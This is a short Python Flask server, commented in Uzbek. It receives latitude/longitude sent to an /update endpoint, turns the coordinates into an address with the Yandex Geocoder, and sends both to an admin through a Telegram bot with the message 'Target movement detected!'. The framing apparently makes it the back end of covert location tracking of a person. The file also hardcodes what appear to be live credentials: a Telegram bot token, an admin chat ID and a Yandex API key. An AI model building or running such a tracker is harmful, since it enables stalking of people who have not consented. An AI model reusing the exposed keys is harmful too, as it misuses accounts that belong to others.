from flask import Flask, request, jsonify
import requests

# --- SOZLAMALAR ---
BOT_TOKEN = "8528348317:AAG6VsZtznGPoz7QpziWwVazkbIK_HnoKfc"
ADMIN_ID = 7441283431

# YANDEX API KALITINI SHU YERGA YOZASIZ (Buni qanday olishni pastda tushuntiraman)
YANDEX_API_KEY = "4a95d315-7313-47c2-804e-22b331dbeb16"

app_flask = Flask(__name__)

def get_yandex_address(lat, lon):
    """Yandex Geocoder API orqali koordinatani aniq manzilga aylantirish"""
    # E'tibor bering: Yandex API koordinatalarni (lon, lat) tartibida qabul qiladi
    url = f"https://geocode-maps.yandex.ru/1.x/?apikey={YANDEX_API_KEY}&geocode={lon},{lat}&format=json&lang=uz_UZ"
    try:
        response = requests.get(url)
        data = response.json()
        
        # Yandex qaytargan JSON ichidan tayyor manzil matnini sug'urib olamiz
        address = data['response']['GeoObjectCollection']['featureMember'][0]['GeoObject']['metaDataProperty']['GeocoderMetaData']['text']
        return address
    except Exception as e:
        print(f"Yandex Geocoder xatosi: {e}")
        return "Manzilni aniqlashning imkoni bo'lmadi"

def send_telegram_location(lat, lon):
    """Telegram API orqali lokatsiya va manzil matnini yuborish"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
    payload = {
        "chat_id": ADMIN_ID,
        "latitude": lat,
        "longitude": lon
    }
    try:
        # 1. Avval xaritadagi lokatsiyani o'zini jo'natamiz
        requests.post(url, json=payload)
        
        # 2. Yandex API orqali manzilni aniqlaymiz
        address = get_yandex_address(lat, lon)
        
        # 3. Formatlangan matnli xabarni yuboramiz
        text = f"📍 **Target harakati aniqlandi!**\nJoylashuv: {address}"
        
        msg_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(msg_url, json={
            "chat_id": ADMIN_ID, 
            "text": text,
            "parse_mode": "Markdown"
        })
    except Exception as e:
        print(f"Xato: {e}")

@app_flask.route('/update', methods=['POST'])
def update():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"error": "No data"}), 400
            
        lat = data.get('lat')
        lon = data.get('lon')
        
        if lat and lon:
            send_telegram_location(lat, lon)
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"error": "Missing coords"}), 400
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app_flask.route('/')
def home():
    return "Server is working perfectly!"

if __name__ == '__main__':
    app_flask.run(host='0.0.0.0', port=5000)
